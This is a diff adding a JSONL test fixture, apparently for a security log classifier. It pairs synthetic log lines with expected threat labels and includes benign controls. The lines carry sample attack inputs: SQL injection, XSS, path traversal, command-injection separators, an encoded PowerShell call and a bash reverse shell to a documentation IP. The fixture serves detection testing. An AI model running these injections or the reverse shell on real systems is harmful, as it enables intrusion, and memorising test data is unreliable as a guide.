@@ -1,0 +1,27 @@
+{"id": "sql-1", "kind": "line", "supported": true, "expected": ["SQL Injection"], "line": "2026-10-12T10:00:01Z WARNING web 203.0.113.10 GET /login?id=' OR 1=1"}
+{"id": "xss-1", "kind": "line", "supported": true, "expected": ["Cross-Site Scripting (XSS)"], "line": "2026-10-12T10:00:02Z WARNING web 203.0.113.11 GET /search?q=<script>alert(1)</script>"}
+{"id": "trav-1", "kind": "line", "supported": true, "expected": ["Directory Traversal"], "line": "2026-10-12T10:00:03Z WARNING web 203.0.113.12 GET /../../etc/passwd"}
+{"id": "cmd-whoami", "kind": "line", "supported": true, "expected": ["Command Injection"], "line": "2026-10-12T10:00:04Z WARNING app 203.0.113.13 Command injection indicator in input: ; whoami"}
+{"id": "cmd-pipe", "kind": "line", "supported": true, "expected": ["Command Injection"], "line": "2026-10-12T10:00:05Z WARNING app 203.0.113.14 input: | whoami"}
+{"id": "cmd-subshell", "kind": "line", "supported": true, "expected": ["Command Injection"], "line": "2026-10-12T10:00:06Z WARNING app 203.0.113.15 payload: $(whoami)"}
+{"id": "cmd-backtick", "kind": "line", "supported": true, "expected": ["Command Injection"], "line": "2026-10-12T10:00:07Z WARNING app 203.0.113.16 payload: `whoami`"}
+{"id": "cmd-encoded-semi", "kind": "line", "supported": true, "expected": ["Command Injection"], "line": "2026-10-12T10:00:08Z WARNING app 203.0.113.17 input: %3B%20whoami"}
+{"id": "cmd-encoded-pipe", "kind": "line", "supported": true, "expected": ["Command Injection"], "line": "2026-10-12T10:00:09Z WARNING app 203.0.113.18 input: %7C%20whoami"}
+{"id": "xss-encoded", "kind": "line", "supported": true, "expected": ["Cross-Site Scripting (XSS)"], "line": "2026-10-12T10:00:10Z WARNING web 203.0.113.19 GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E"}
+{"id": "rev-1", "kind": "line", "supported": true, "expected": ["Reverse Shell"], "line": "2026-10-12T10:00:11Z WARNING host 203.0.113.20 reverse shell bash -i >& /dev/tcp/203.0.113.20/4444"}
+{"id": "ps-1", "kind": "line", "supported": true, "expected": ["Suspicious PowerShell"], "line": "2026-10-12T10:00:12Z WARNING host 203.0.113.21 powershell -enc SQBFAFgA"}
+{"id": "web-1", "kind": "line", "supported": true, "expected": ["Web Shell"], "line": "2026-10-12T10:00:13Z WARNING web 203.0.113.22 GET /uploads/c99.php"}
+{"id": "priv-1", "kind": "line", "supported": true, "expected": ["Privilege Escalation / Unauthorized Access"], "line": "2026-10-12T10:00:14Z WARNING auth 203.0.113.23 sudo: AUTHENTICATION FAILURE for root"}
+{"id": "port-1", "kind": "line", "supported": true, "expected": ["Port Scan Activity"], "line": "2026-10-12T10:00:15Z WARNING ids 203.0.113.24 port scan detected from 203.0.113.24"}
+{"id": "mal-trojan", "kind": "line", "supported": true, "expected": ["Trojan"], "line": "2026-10-12T10:00:16Z WARNING av 203.0.113.25 trojan detected in file.exe"}
+{"id": "crit-kernel", "kind": "line", "supported": true, "expected": ["Critical System Event"], "line": "2026-10-12T10:00:17Z CRITICAL kernel kernel panic - not syncing"}
+{"id": "overlap-cmd-trav", "kind": "line", "supported": true, "expected": ["Command Injection", "Directory Traversal"], "line": "2026-10-12T10:00:18Z WARNING app 203.0.113.26 Command injection: ; cat /etc/passwd"}
+{"id": "benign-health", "kind": "line", "supported": true, "expected": [], "line": "2026-10-12T10:00:19Z INFO web 192.0.2.10 GET /health check HTTP/1.1 200"}
+{"id": "benign-word-attack", "kind": "line", "supported": true, "expected": [], "line": "2026-10-12T10:00:20Z INFO app 192.0.2.11 user said the word attack in a comment"}
+{"id": "benign-whoami-docs", "kind": "line", "supported": true, "expected": [], "line": "2026-10-12T10:00:21Z INFO docs 192.0.2.12 whoami is documented in the admin guide"}
+{"id": "benign-filesystem", "kind": "line", "supported": true, "expected": [], "line": "2026-10-12T10:00:22Z INFO fs 192.0.2.13 filesystem(check) completed successfully"}
+{"id": "benign-single-fail", "kind": "line", "supported": true, "expected": [], "line": "2026-10-12T10:00:26Z WARNING sshd 198.51.100.40 Failed password for guest"}
+{"id": "bf-group", "kind": "group", "supported": true, "expected": ["Brute Force Attack"], "match_ip": "198.51.100.25", "lines": ["2026-10-12T10:00:23Z WARNING sshd 198.51.100.25 Failed password for admin", "2026-10-12T10:00:24Z WARNING sshd 198.51.100.25 Failed password for admin", "2026-10-12T10:00:25Z WARNING sshd 198.51.100.25 Failed password for admin"]}
+{"id": "unsup-ifs-whoami", "kind": "line", "supported": false, "expected": ["Command Injection"], "line": "2026-10-12T10:00:27Z WARNING app 203.0.113.30 payload: ;${IFS}whoami"}
+{"id": "unsup-critical-level", "kind": "line", "supported": false, "expected": ["Critical System Event"], "line": "2026-10-12T10:00:28Z CRITICAL app 203.0.113.31 Critical system error without a keyword"}
+{"id": "unsup-sql-sleep", "kind": "line", "supported": false, "expected": ["SQL Injection"], "line": "2026-10-12T10:00:29Z WARNING web 203.0.113.32 GET /item?id=1;WAITFOR DELAY '0:0:5'"}
